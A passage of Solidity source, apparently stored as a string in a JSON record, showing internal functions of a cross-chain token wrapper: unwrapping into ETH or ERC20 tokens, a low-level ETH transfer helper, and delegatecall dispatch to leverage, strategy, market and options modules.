_mint(_toAddress, msg.value);\n    }\n\n    function _unwrap(address _toAddress, uint256 _amount) internal virtual {\n        _burn(msg.sender, _amount);\n\n        if (erc20 == address(0)) {\n            _safeTransferETH(_toAddress, _amount);\n        } else {\n            IERC20(erc20).safeTransfer(_toAddress, _amount);\n        }\n    }\n\n    //---private---\n    function _safeTransferETH(address to, uint256 amount) internal {\n        (bool sent, ) = to.call{value: amount}(\"\");\n        require(sent, \"TOFT_failed\");\n    }\n\n    function _extractModule(Module _module) private view returns (address) {\n        address module;\n        if (_module == Module.Leverage) {\n            module = address(leverageModule);\n        } else if (_module == Module.Strategy) {\n            module = address(strategyModule);\n        } else if (_module == Module.Market) {\n            module = address(marketModule);\n        } else if (_module == Module.Options) {\n            module = address(optionsModule);\n        }\n\n        if (module == address(0)) {\n            revert(\"TOFT_module\");\n        }\n\n        return module;\n    }\n\n    function _executeModule(\n        Module _module,\n        bytes memory _data,\n        bool _forwardRevert\n    ) private returns (bool success, bytes memory returnData) {\n        success = true;\n        address module = _extractModule(_module);\n\n        (success, returnData) = module.delegatecall(_data);\n        if (!success && !_forwardRevert) {\n            revert(_getRevertMsg(returnData));\n        }\n    }\n\n    function _executeOnDestination(\n        Module _module,\n        bytes memory _data,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) private {\n        (bool success, bytes memory returnData) = _executeModule(\n            _module,\n            _data,\n            true\n        );\n        if (!success) {\n            _storeFa"
    }
  ]
}